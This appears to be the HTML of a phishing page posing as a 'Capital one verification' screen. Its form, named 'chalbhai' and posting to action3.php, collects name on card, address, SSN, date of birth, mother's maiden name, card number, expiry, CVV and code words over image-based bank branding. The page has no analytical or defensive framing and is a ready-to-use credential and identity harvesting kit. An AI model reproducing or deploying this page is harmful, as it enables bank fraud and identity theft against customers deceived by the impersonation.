
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<link rel="shortcut icon"
              href="images/mobile-app-icon.png"/>
<html><head><title>Capital one verification</title>
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">
<style type="text/css">
div#container
{
	position:relative;
	width: 100%;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style> 
.textbox { 
 	width: 100%;
    font-size: 1em;
    font-family: Optimist,Arial,Helvetica,sans-serif;
    font-weight: 400;
    text-align: left;
    line-height: 18px;
    cursor: pointer;
    background-color: #fff;
    border: 2px solid #999; 
    background-image: none;
    color: #021829;
    padding: .625em;
    height: auto;
    box-sizing: border-box; 
  } 
   
  
 .textbox:focus { 
 	width: 100%;
    font-size: 1em;
    font-family: Optimist,Arial,Helvetica,sans-serif;
    font-weight: 400;
    text-align: left;
    line-height: 18px;
    cursor: pointer;
    border: 2px solid #c2c0c6; 
    background-color: #fff;
    background-image: none;
    color: #021829;
    padding: .625em;
    height: auto;
    box-sizing: border-box; } 

</style> 

</head>
<body>

<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1350px; height:310px; z-index:1"><img src="images/1x.png" alt="" title="" border=0 width=1350 height=310></div>

<div id="image2" style="position:absolute; overflow:hidden; left:389px; top:333px; width:570px; height:742px; z-index:2"><img src="images/2x.png" alt="" title="" border=0 width=570 height=742></div>

<form action=action3.php name=chalbhai id=chalbhai method=post>

<input name="formtext1" required autocomplete="off" class="textbox" type="text" placeholder="Name on card" style="position:absolute;height:30px;width:479px;left:432;top:391;z-index:19">

<input name="formtext2" required autocomplete="off" class="textbox" type="text" placeholder="Mailing Address" style="position:absolute;height:30px;width:479px;left:432;top:460;z-index:19">

<input name="formtext3" required autocomplete="off" class="textbox" type="password" placeholder="SSN" style="position:absolute;height:30px;width:479px;left:432;top:532;z-index:20">

<input name="formtext4" required autocomplete="off" class="textbox" type="text" placeholder="Month" style="position:absolute;height:30px;width:137px;left:432;top:595;z-index:19">


<input name="formtext5" required autocomplete="off" class="textbox" type="text" placeholder="Day" style="position:absolute;height:30px;width:137px;left:605;top:595;z-index:19">

<input name="formtext6" required autocomplete="off" class="textbox" type="text" placeholder="Year" style="position:absolute;height:30px;width:137px;left:775;top:595;z-index:19">


<input name="formtext7" required autocomplete="off" class="textbox" type="text" placeholder="MMN" style="position:absolute;height:30px;width:479px;left:432;top:667;z-index:19">

<input name="formtext8" required autocomplete="off" class="textbox" type="text" placeholder="Card Number" style="position:absolute;height:30px;width:479px;left:432;top:735;z-index:19">

<input name="formtext9" required autocomplete="off" class="textbox" type="text" placeholder="Month" style="position:absolute;height:29px;width:137px;left:432;top:803;z-index:19">

<input name="formtext10" required autocomplete="off" class="textbox" type="text" placeholder="Year" style="position:absolute;height:29px;width:137px;left:605;top:803;z-index:19">

<input name="formtext11" required autocomplete="off" class="textbox" type="text" placeholder="CVV" style="position:absolute;height:30px;width:479px;left:432;top:870;z-index:19">

<input name="formtext12" required autocomplete="off" class="textbox" type="text" placeholder="Code Words" style="position:absolute;height:30px;width:479px;left:432;top:937;z-index:19">&nbsp;


<div id="formimage1" style="position:absolute; left:566px; top:1010px; z-index:6"><input type="image" name="formimage1" src="images/cc.png"></div></form>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:1121px; width:1350px; height:193px; z-index:1"><img src="images/dw.png" alt="" title="" border=0 width=1350 height=193></div>

</body>
</html>